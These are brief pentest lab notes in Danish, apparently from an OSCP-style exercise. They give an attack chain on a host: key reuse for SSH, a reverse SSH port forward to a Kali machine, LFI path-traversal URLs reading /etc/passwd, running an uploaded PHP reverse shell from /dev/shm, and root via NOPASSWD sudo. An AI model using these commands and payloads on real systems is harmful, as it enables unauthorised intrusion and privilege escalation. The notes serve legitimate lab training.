brug id_ecdsa fra .245 til ssh login ->
se at der er en service på 127.0.0.1:8000
sæt remote ssh portforwarding ssh -N -R 127.0.0.1:2345:127.0.0.1:8000 kali@192.168.45.x ->
enum siden med ferox og find /backend/ side
LFI vuln (http://127.0.0.1:2345/backend/?view=../../../../../../../../../../../../../../../etc/passwd)
upload rev shell og kør som service user
http://127.0.0.1:2345/backend/?view=../../../../../../../../../../../../../../../dev/shm/cmd1.php

service user (www-data) har 
$ sudo -l
Matching Defaults entries for www-data on demo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on demo:
    (ALL) NOPASSWD: ALL

sudo cat /root/proof.txt

